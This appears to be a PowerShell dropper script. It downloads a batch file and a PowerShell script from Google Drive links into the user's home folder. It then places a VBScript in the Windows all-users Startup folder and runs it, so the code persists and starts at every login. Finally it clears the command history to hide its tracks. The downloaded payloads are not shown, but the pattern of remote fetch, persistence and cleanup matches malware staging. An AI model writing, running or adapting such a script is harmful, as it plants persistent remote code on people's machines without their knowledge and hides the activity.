cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1frL_2HekgwFrcAxt_ATltoQHS4v-SEyH" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FFNPRwKOhMnO5lDxXO3XaUhkZPp31sfP" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ctOSIOgWU9dnYaUefB7b2jl3u9juPIC2" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit